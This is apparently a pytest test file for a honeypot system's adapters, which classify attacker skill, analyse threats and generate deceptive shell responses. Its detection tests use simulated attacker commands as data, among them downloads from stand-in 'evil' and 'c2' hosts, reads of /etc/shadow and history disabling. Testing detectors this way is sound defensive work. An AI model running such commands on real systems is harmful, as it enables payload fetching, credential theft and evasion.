"""Tests for ragin/cycle/adapters.py — ChrolloAdapter, DonAdapter, HisokaAdapter."""

from __future__ import annotations

from types import SimpleNamespace
from unittest.mock import MagicMock

import pytest

from ragin.cycle.adapters import (
    ChrolloAdapter,
    DonAdapter,
    HisokaAdapter,
    _match_rules,
    _extract_evidence,
    _EVASION_RULES,
    _TOOL_RULES,
    _CREDENTIAL_RULES,
)

# ── Fixtures ──────────────────────────────────────────────────────────────────


@pytest.fixture()
def mock_classifier() -> MagicMock:
    """Mock ChrolloClassifier with a successful ClassificationResult."""
    from ragin.chrollo.models import SkillLevel

    result = SimpleNamespace(
        skill_level=SkillLevel.INTERMEDIATE,
        confidence=0.87,
        session_id="test-sess",
        features_used=["cmd_count", "entropy", "unique_commands"],
        feature_values={"cmd_count": 12.0, "entropy": 3.4567, "unique_commands": 8.0},
    )
    cls = MagicMock()
    cls.classify.return_value = result
    return cls


@pytest.fixture()
def mock_engine() -> MagicMock:
    """Mock ThreatRAGEngine with a successful ThreatAnalysis."""
    from ragin.don.models import (
        IOC,
        ClassificationLabel,
        IOCType,
        MITRETactic,
        SeverityLevel,
        ThreatActor,
    )

    result = SimpleNamespace(
        analysis_id="analysis-123",
        severity=SeverityLevel.HIGH,
        classification=ClassificationLabel.MALICIOUS,
        confidence=0.91,
        sophistication_score=7.5,
        summary="APT29-style lateral movement detected",
        recommendations=["isolate-host", "reset-credentials"],
        tactics=[
            MITRETactic(tactic_id="TA0008", tactic_name="Lateral Movement", confidence=0.85),
        ],
        threat_actors=[ThreatActor(name="APT29", confidence=0.72, known_ttps=["T1055", "T1071"])],
        iocs=[IOC(type=IOCType.IP, value="192.168.1.100", confidence=0.9)],
    )
    eng = MagicMock()
    eng.analyze.return_value = result
    return eng


@pytest.fixture()
def mock_deceiver() -> MagicMock:
    """Mock AdaptiveDeceiver with a successful DeceptionResponse."""
    from ragin.hisoka.models import DeceptionResponse

    result = DeceptionResponse(
        session_id="test-sess",
        response_text="root@honeypot:~$ ls",
        persona_used="intermediate",
        artifacts_injected=["fake_sam.hive"],
        engagement_score=0.65,
    )
    dec = MagicMock()
    dec.generate_response.return_value = result
    return dec


# ── ChrolloAdapter ────────────────────────────────────────────────────────────


class TestChrolloAdapter:
    def test_classify_success(self, mock_classifier: MagicMock) -> None:
        adapter = ChrolloAdapter(classifier=mock_classifier)
        result = adapter.classify(
            attacker_input="whoami",
            session_context={"session_id": "s1", "attacker_inputs": ["ls", "whoami"]},
        )
        assert result["skill_level"] == "intermediate"
        assert result["confidence"] == pytest.approx(0.87)
        assert result["session_id"] == "test-sess"
        assert "cmd_count" in result["features_used"]
        mock_classifier.classify.assert_called_once()

    def test_classify_empty_commands_uses_attacker_input(self, mock_classifier: MagicMock) -> None:
        adapter = ChrolloAdapter(classifier=mock_classifier)
        adapter.classify(
            attacker_input="id",
            session_context={"session_id": "s2"},
        )
        call_args = mock_classifier.classify.call_args[0][0]
        assert len(call_args.commands) == 1
        assert call_args.commands[0].command == "id"

    def test_classify_fallback_on_error(self, mock_classifier: MagicMock) -> None:
        mock_classifier.classify.side_effect = RuntimeError("model not loaded")
        adapter = ChrolloAdapter(classifier=mock_classifier)
        result = adapter.classify(
            attacker_input="whoami",
            session_context={"session_id": "s3"},
        )
        assert result["skill_level"] == "novice"
        assert result["confidence"] == 0.0
        assert "model not loaded" in result["error"]


# ── DonAdapter ────────────────────────────────────────────────────────────────


class TestDonAdapter:
    def test_analyze_success(self, mock_engine: MagicMock) -> None:
        adapter = DonAdapter(engine=mock_engine)
        result = adapter.analyze(
            attacker_input="psexec",
            session_context={
                "session_id": "s1",
                "classification": {"skill_level": "expert", "confidence": 0.9},
                "attacker_inputs": ["whoami", "psexec"],
                "system_responses": ["root", ""],
            },
        )
        assert result["severity"] == "high"
        assert result["classification"] == "malicious"
        assert result["confidence"] == pytest.approx(0.91)
        assert result["analysis_id"] == "analysis-123"
        assert len(result["tactics"]) == 1
        assert result["tactics"][0]["id"] == "TA0008"
        assert len(result["iocs"]) == 1
        mock_engine.analyze.assert_called_once()

    def test_analyze_builds_session_log(self, mock_engine: MagicMock) -> None:
        adapter = DonAdapter(engine=mock_engine)
        adapter.analyze(
            attacker_input="nmap -sV",
            session_context={
                "session_id": "s2",
                "attacker_inputs": ["ls", "id"],
                "system_responses": ["file1", "uid=0"],
            },
        )
        call_args = mock_engine.analyze.call_args[0]
        req = call_args[0]
        session_log = call_args[1]
        assert req.session_id == "s2"
        assert len(session_log) == 5  # 2 inputs + 2 responses + 1 current
        assert session_log[-1]["content"] == "nmap -sV"

    def test_analyze_classification_mapping(self, mock_engine: MagicMock) -> None:
        adapter = DonAdapter(engine=mock_engine)
        adapter.analyze(
            attacker_input="ls",
            session_context={
                "session_id": "s3",
                "classification": {"skill_level": "novice", "confidence": 0.5},
            },
        )
        req = mock_engine.analyze.call_args[0][0]
        from ragin.don.models import ClassificationLabel

        assert req.classification == ClassificationLabel.BENIGN

    def test_analyze_fallback_on_error(self, mock_engine: MagicMock) -> None:
        mock_engine.analyze.side_effect = RuntimeError("gateway down")
        adapter = DonAdapter(engine=mock_engine)
        result = adapter.analyze(
            attacker_input="whoami",
            session_context={"session_id": "s4"},
        )
        assert result["threat_summary"] == ""
        assert "gateway down" in result["error"]

    def test_analyze_evidence_populated(self, mock_engine: MagicMock) -> None:
        """tools_used, evasion_techniques, credential_access from attacker_inputs."""
        adapter = DonAdapter(engine=mock_engine)
        result = adapter.analyze(
            attacker_input="nmap -sV",
            session_context={
                "session_id": "s5",
                "classification": {"skill_level": "advanced", "confidence": 0.8},
                "attacker_inputs": [
                    "unset HISTFILE",
                    "wget http://evil/payload.sh",
                    "whoami",
                    "cat /etc/shadow",
                    "curl http://c2/beacon",
                    "nmap 10.0.0.0/24",
                ],
            },
        )
        assert "history_disabled" in result["evasion_techniques"]
        assert "curl" in result["tools_used"]
        assert "wget" in result["tools_used"]
        assert "nmap" in result["tools_used"]
        assert "user_enumeration" in result["credential_access"]
        assert "password_file_read" in result["credential_access"]

    def test_analyze_evidence_empty_on_no_match(self, mock_engine: MagicMock) -> None:
        """Evidence fields are empty dicts (never None) when no rule matches."""
        adapter = DonAdapter(engine=mock_engine)
        result = adapter.analyze(
            attacker_input="echo hello",
            session_context={
                "session_id": "s6",
                "classification": {"skill_level": "novice", "confidence": 0.3},
                "attacker_inputs": ["echo hello"],
            },
        )
        assert result["evasion_techniques"] == {}
        assert result["tools_used"] == {}
        assert result["credential_access"] == {}

    def test_analyze_evidence_on_error_path(self, mock_engine: MagicMock) -> None:
        """Evidence fields present in error dict when engine crashes."""
        mock_engine.analyze.side_effect = RuntimeError("timeout")
        adapter = DonAdapter(engine=mock_engine)
        result = adapter.analyze(
            attacker_input="whoami",
            session_context={
                "session_id": "s7",
                "attacker_inputs": ["base64 -d payload", "whoami"],
            },
        )
        assert "obfuscation" in result["evasion_techniques"]
        assert "user_enumeration" in result["credential_access"]
        assert "timeout" in result["error"]

    def test_analyze_candidate_actors_has_basis(self, mock_engine: MagicMock) -> None:
        """Each candidate_actor entry includes the basis field."""
        adapter = DonAdapter(engine=mock_engine)
        result = adapter.analyze(
            attacker_input="psexec",
            session_context={
                "session_id": "s8",
                "classification": {"skill_level": "expert", "confidence": 0.9},
            },
        )
        assert len(result["candidate_actors"]) == 1
        actor = result["candidate_actors"][0]
        assert actor["name"] == "APT29"
        assert actor["basis"] == "tactic-heuristic"
        assert isinstance(actor["confidence"], float)
        assert "known_ttps" in actor
        assert "T1055" in actor["known_ttps"]

    def test_analyze_ttps_merged(self, mock_engine: MagicMock) -> None:
        """ttps_seen merges actor known_ttps and tactic technique IDs."""
        adapter = DonAdapter(engine=mock_engine)
        result = adapter.analyze(
            attacker_input="psexec",
            session_context={
                "session_id": "s9",
                "classification": {"skill_level": "advanced", "confidence": 0.8},
            },
        )
        assert "T1055" in result["ttps_seen"]
        assert "T1071" in result["ttps_seen"]
        assert result["ttps_seen"] == result["extracted_techniques"]


# ── HisokaAdapter ─────────────────────────────────────────────────────────────


class TestHisokaAdapter:
    def test_generate_response_success(self, mock_deceiver: MagicMock) -> None:
        adapter = HisokaAdapter(deceiver=mock_deceiver)
        result = adapter.generate_response(
            attacker_input="cat /etc/passwd",
            session_context={"session_id": "s1", "skill_level": "intermediate"},
        )
        assert result["session_id"] == "test-sess"
        assert result["persona_used"] == "intermediate"
        assert result["engagement_score"] == pytest.approx(0.65)
        assert "fake_sam.hive" in result["artifacts_injected"]
        mock_deceiver.generate_response.assert_called_once()

    def test_generate_response_fallback_on_error(self, mock_deceiver: MagicMock) -> None:
        mock_deceiver.generate_response.side_effect = RuntimeError("LLM timeout")
        adapter = HisokaAdapter(deceiver=mock_deceiver)
        result = adapter.generate_response(
            attacker_input="whoami",
            session_context={"session_id": "s2"},
        )
        assert result["persona_used"] == "unknown"
        assert result["engagement_score"] == 0.0
        assert "LLM timeout" in result["error"]

    def test_generate_response_passes_context_through(self, mock_deceiver: MagicMock) -> None:
        adapter = HisokaAdapter(deceiver=mock_deceiver)
        ctx = {"session_id": "s3", "skill_level": "apt", "extra_key": "extra_val"}
        adapter.generate_response("ls -la", ctx)
        call_args = mock_deceiver.generate_response.call_args
        assert call_args[0][0] == "ls -la"
        assert call_args[0][1]["skill_level"] == "apt"
